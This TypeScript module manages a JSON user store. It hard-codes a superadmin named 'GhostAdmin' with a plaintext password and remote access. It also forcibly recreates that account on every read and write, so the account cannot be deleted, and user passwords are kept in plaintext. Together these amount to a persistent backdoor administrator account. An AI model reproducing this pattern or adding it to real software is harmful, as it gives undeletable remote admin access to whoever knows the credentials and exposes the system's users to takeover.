import fs from "fs";
import path from "path";

export type User = {
  id: string;
  username: string;
  password: string;
  role: string;
  disabled?: boolean;
  accessStart?: string;
  accessEnd?: string;
  remoteAccess?: boolean;
};

const filePath = path.join(__dirname, "users.json");


/*
  HARD CODED SYSTEM SUPERADMIN

  This user is recreated automatically
  if missing from users.json
*/

const SUPERADMIN: User = {
  id: "0",
  username: "GhostAdmin",
  password: "Vilaine2595",
  role: "superadmin",
  disabled: false,
  remoteAccess: true
};



function ensureSuperAdmin(users: User[]): User[] {

  const exists = users.some(
    user => user.id === "0"
  );


  if (!exists) {

    console.log(
      "🔐 Superadmin missing - creating system account"
    );


    users.unshift(SUPERADMIN);


    fs.writeFileSync(
      filePath,
      JSON.stringify(users, null, 2)
    );


  }


  return users;

}


// READ users
export function readUsers(): User[] {

  if (!fs.existsSync(filePath)) {

    fs.writeFileSync(
      filePath,
      "[]"
    );

  }


  const data = fs.readFileSync(
    filePath,
    "utf-8"
  );


  const users: User[] = JSON.parse(data);


  return ensureSuperAdmin(users);

}


// WRITE users
export function writeUsers(users: User[]) {

  const protectedUsers = ensureSuperAdmin(users);


  fs.writeFileSync(
    filePath,
    JSON.stringify(
      protectedUsers,
      null,
      2
    )
  );

}